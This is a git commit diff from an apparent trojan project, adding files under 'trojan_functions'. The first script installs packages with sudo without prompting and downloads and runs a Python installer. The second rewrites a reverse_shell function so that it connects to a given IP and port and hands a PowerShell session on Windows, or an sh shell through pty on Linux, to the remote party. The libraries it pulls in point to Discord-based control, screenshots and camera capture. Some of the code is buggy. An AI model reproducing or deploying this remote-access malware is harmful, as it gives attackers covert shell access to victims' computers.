a2dd296fd34236b00d86068727a5476a9411a1c0
LunarStone292 <93814414+LunarStone292@users.noreply.github.com>
2023-02-11 17:18:21 +0100

    Add files via upload

---
+++ trojan_functions/check_requirements.py
@@ -0,0 +1,47 @@
+import os, platform, subprocess
+
+def check():
+    r = os.system("pip3 install discord_webhook")
+    if(r == 1):
+        r = os.system("pip install discord_webhook")
+        if(r == 1):
+            from urllib import request
+            if(platform.system == "Windows"):
+                remote_url = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe'
+                local_file = '''%appdata%\\python-3.11.1-amd64.exe'''
+                request.urlretrieve(remote_url, local_file)
+                process = subprocess.Popen(local_file, shell=True, stdin=subprocess.PIPE)
+                path = os.path.join(location="%appdata%", file="python-3.11.1-amd64.exe")
+                os.remove(path)
+                print("please, restart the program...")
+                exit()
+            elif (platform.system == "Linux"):
+                s = os.system("sudo apt install python3 -y")
+                if(s == 1):
+                    s = os.system("sudo pacman -S python3 -y")
+                    if(s == 1):
+                        os.system("sudo yum install python3 -y")
+                        exit()
+                    else:
+                        exit()
+                else:
+                    exit()
+        else:
+            os.system("pip install requests")
+            os.system("pip install discord")
+            os.system("pip install opencv-python")
+            os.system("pip install pytube")
+            os.system("pip install pyautogui")
+    else:
+        os.system("pip3 install requests")
+        os.system("pip3 install discord")
+        os.system("pip3 install opencv-python")
+        os.system("pip3 install pytube")
+        os.system("pip3 install pyautogui")
+    if(platform.system() == "Linux"):
+        l = os.system("sudo apt-get install scrot -y")
+        if(l == 1):
+            r = os.system("sudo pacman -S scrot -y")
+            if(r == 1):
+                os.system("sudo yum install scrot -y")
+    os.system("cls||clear")
--- trojan_functions/rv.py
+++ trojan_functions/rv.py
@@ -3,8 +3,40 @@ def reverse_shell(ip, port):
     ip = ip
     port = port
     if(platform.system() == "Windows"):
-        rev_shell = '''powershell -nop -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'''' + str(ip) + '''\', ''' + str(port) + ''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''
-        os.system(rev_shell)
+        import os,socket,subprocess,threading;
+        def s2p(s, p):
+            while True:
+                data = s.recv(1024)
+                if len(data) > 0:
+                    p.stdin.write(data)
+                    p.stdin.flush()
+
+        def p2s(s, p):
+            while True:
+                s.send(p.stdout.read(1))
+
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((str(ip), int(port)))
+
+        p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+        s2p_thread = threading.Thread(target=s2p, args=[s, p])
+        s2p_thread.daemon = True
+        s2p_thread.start()
+
+        p2s_thread = threading.Thread(target=p2s, args=[s, p])
+        p2s_thread.daemon = True
+        p2s_thread.start()
+
+        try:
+            p.wait()
+        except KeyboardInterrupt:
+            s.close()
     else:
-        rev_shell = """"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""" + str(ip) + """\",""" + str(port) + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
-        os.system(rev_shell)
+            import socket, subprocess, os, pty
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((str(ip), str(port)))
+            os.dup2(s.fileno(),0)
+            os.dup2(s.fileno(),1)
+            os.dup2(s.fileno(),2)
+            pty.spawn("sh")
